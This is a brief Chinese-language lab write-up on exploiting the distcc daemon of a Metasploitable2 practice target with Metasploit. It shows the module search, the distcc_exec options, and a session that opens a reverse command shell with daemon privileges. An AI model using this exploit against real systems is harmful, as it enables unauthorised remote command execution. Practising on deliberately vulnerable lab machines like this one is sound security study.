## Distcc服务漏洞
不知道这个服务是干嘛的，就搜索了。。

distcc 简单的分布式编译客户端和服务器

distcc 是一款可是通过网络上的多个机器分布编译 C 或 C++ 代码的程序。distcc 和 本地编译器有着同样的运算结果，可以简单的安装使用，而且明显快于本地编译。 distcc 不要求所有机器公用一套文件系统、同步时钟、相同的库或头文件。 

0、原来是分布式编译。
```bash
msf > search distcc
Matching Modules
================

   Name                           Disclosure Date  Rank       Description
   ----                           ---------------  ----       -----------
   exploit/unix/misc/distcc_exec  2002-02-01       excellent  DistCC Daemon Command Execution

#得到了一个 exploit
#不知道，能不能用，试下
msf > use exploit/unix/misc/distcc_exec
msf exploit(distcc_exec) > show options
Module options (exploit/unix/misc/distcc_exec):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST  metasploitable2  yes       The target address
   RPORT  3632             yes       The target port

Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

#这个是我设置过了。
msf exploit(distcc_exec) > set RHOST metasploitable2
msf exploit(distcc_exec) > exploit

[*] Started reverse double handler
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo I1be6jo5ltPZMOv4;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "I1be6jo5ltPZMOv4\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 4 opened (192.168.199.237:4444 -> 192.168.199.169:51603) at 2015-04-02 01:57:52 +0800

id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
#结果发现不是root权限。
#。。。。。。
```

